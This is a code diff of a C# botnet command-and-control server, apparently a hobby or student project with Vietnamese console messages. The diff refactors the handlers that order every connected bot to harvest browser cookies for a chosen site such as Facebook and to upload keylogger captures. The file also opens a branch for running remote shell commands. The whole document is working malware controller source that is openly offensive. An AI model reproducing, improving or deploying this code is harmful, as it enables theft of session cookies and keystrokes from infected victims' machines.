@@ -10,6 +10,7 @@ using System.IO;
 using System.Runtime.InteropServices.ComTypes;
 using System.Threading;
 using System.Collections;
+using System.Runtime.CompilerServices;
 
 namespace Control
 {
@@ -23,17 +24,17 @@ namespace Control
      
 
         static ASCIIEncoding encoding = new ASCIIEncoding();
+        static List<Task> tasks = new List<Task>();
+        static Boolean isFinished = true;
 
         static void Main(string[] args)
         {
             try
             {
-
-                IPAddress address = IPAddress.Parse("192.168.1.100");
+                IPAddress address = IPAddress.Parse("192.168.1.101");
 
                 TcpListener listener = new TcpListener(address, PORT_NUMBER);
 
-                // 1. listen
                 listener.Start();
 
                 Console.WriteLine("Server started on " + listener.LocalEndpoint);
@@ -44,22 +45,6 @@ namespace Control
 
                 Thread th_server_handleCommand = new Thread(() => handleControlBot(listener));
                 th_server_handleCommand.Start();
-
-                //TcpClient tcplient = listener.AcceptTcpClient();
-                // Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
-                // Socket socket = listener.AcceptSocket();
-
-
-                //while (true)
-                //{
-                //    Console.WriteLine(" Command & Control Center");
-                //    Console.Write("Enter your command: ");
-                //    string command = Console.ReadLine();
-
-                //    // handleCommand(command,socket);
-                //    handleCommand(command);
-                //}
-
             }
             catch (Exception ex)
             {
@@ -73,27 +58,20 @@ namespace Control
                 TcpClient tcplient = listener.AcceptTcpClient();
                 Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
                 string clientName = ((IPEndPoint)tcplient.Client.RemoteEndPoint).Address.ToString();
-
                 clients.Add(tcplient, clientName);
-
-                // Thread clientThread = new Thread(() => handleControlBot(clientSocket));
-                // clientThread.Start();
             }
-
         }
-        public static void handleControlBot(TcpListener listener)
+        public static  void handleControlBot(TcpListener listener)
         {
             while (true)
             {
-                if(clients.Count > 0)
+                if(clients.Count > 0 && isFinished == true)
                 {
                     Console.WriteLine(" Command & Control Center");
                     Console.Write("Enter your command: ");
                     string command = Console.ReadLine();
-
-                    // handleCommand(command,socket);
                     handleCommand(command);
-                }    
+                }
                 
             }
         }
@@ -143,7 +121,7 @@ namespace Control
                 fs.Write(data, 0, dataLength);
                 fs.Close();
          }    
-        public static void handleCommand(string command)
+        public static async void handleCommand(string command)
         {
             //Socket socket = client.Client;
             command = command.Trim().ToLower();
@@ -164,17 +142,42 @@ namespace Control
                 Console.WriteLine("Enter url you want to get cookie, please write full url (example : https://www.facebook.com):");
                 string url = Console.ReadLine();
                 string ms = "cookies?" + url + "?";
+                List<Task> cookies = new List<Task>();
+
+                //foreach (var cli in clients.Keys)
+                //{
+                //    isFinished = false;
+                //    Thread th_cli = new Thread(() => {
+                //        sendMessageSocket(ms, cli.Client);
+                //        Console.WriteLine("Sending request get cookies...");
+                //        receiveFileSocket(cli, "cookies");
+                //        Console.WriteLine("Receive cookies complete!");
+                //    });
+                //    th_cli.Start();
+                //}
 
                 foreach (var cli in clients.Keys)
                 {
-                    Thread th_cli = new Thread(() => {
-                        sendMessageSocket(ms, cli.Client);
-                        Console.WriteLine("Sending request get cookies...");
-                        receiveFileSocket(cli, "cookies");
-                        Console.WriteLine("Receive cookies complete!");
-                    });
-                    th_cli.Start();
+                    isFinished = false;
+                    cookies.Add(Task.Run(async () =>
+                    {
+                        try
+                        {
+                            clients.TryGetValue(cli, out string ip);
+                            sendMessageSocket(ms, cli.Client);
+                            Console.WriteLine("Sending request get cookies to "+ip +"...");
+                            receiveFileSocket(cli, "cookies");
+                            Console.WriteLine("Receive cookies from " + ip+" complete!");
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
+                        }
+                    }));
                 }
+                await Task.WhenAll(cookies);
+                isFinished = true;
+                Console.WriteLine("Nhan thanh cong cac file cookies tu botnet.");
                 //sendMessageSocket(ms, socket);
                 //Console.WriteLine("Sending request get cookies...");
                 //receiveFileSocket(client,"cookies");
@@ -182,20 +185,67 @@ namespace Control
             }
             else if (command == "get keylogger")
             {
-               
+
+
+                //foreach (var cli in clients.Keys)
+                //{
+                //    //Thread th_cli = new Thread(() => {
+
+                //    //    clients.TryGetValue(cli, out string ip);
+                //    //    sendMessageSocket("keylogger", cli.Client);
+                //    //    Console.WriteLine("Sending request get keylogger to "+ ip+"...");
+                //    //    receiveFileSocket(cli, "keylogger");
+                //    //    Console.WriteLine("Receive keylogger from "+ip+"!");
+                //    //});
+                //    //th_cli.Start();
+
+                //    //<-------------------->
+                //    Task task = Task.Run(async () =>
+                //    {
+                //        try
+                //        {
+                //            clients.TryGetValue(cli, out string ip);
+                //            sendMessageSocket("keylogger", cli.Client);
+                //            Console.WriteLine("Sending request get keylogger to " + ip + "...");
+                //            receiveFileSocket(cli, "keylogger");
+                //            Console.WriteLine("Receive keylogger from " + ip + "!");
+                //        }
+                //        catch (Exception ex)
+                //        {
+                //            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
+                //        }
+                //    });
+
+                //    tasks.Add(task);
+                //}
+                //await Task.WhenAll(tasks);
+                //Console.WriteLine("Xong hết tất cả tasks" );
+
+                List<Task> keyloggerTasks = new List<Task>();
 
                 foreach (var cli in clients.Keys)
                 {
-                    Thread th_cli = new Thread(() => {
-                        
-                        clients.TryGetValue(cli, out string ip);
-                        sendMessageSocket("keylogger", cli.Client);
-                        Console.WriteLine("Sending request get keylogger to "+ ip+"...");
-                        receiveFileSocket(cli, "keylogger");
-                        Console.WriteLine("Receive keylogger from "+ip+"!");
-                    });
-                    th_cli.Start();
+                    isFinished = false;
+                    keyloggerTasks.Add(Task.Run(async () =>
+                    {
+                        try
+                        {
+                            clients.TryGetValue(cli, out string ip);
+                            sendMessageSocket("keylogger", cli.Client);
+                            Console.WriteLine("Sending request get keylogger to " + ip + "...");
+                            receiveFileSocket(cli, "keylogger");
+                            Console.WriteLine("Receive keylogger from " + ip + "!");
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
+                        }
+                    }));
                 }
+
+                await Task.WhenAll(keyloggerTasks); 
+                isFinished = true;
+                Console.WriteLine("Nhan thanh cong cac file keylogger tu botnet.");
             }
             else if (command == "run cmd command")
             {
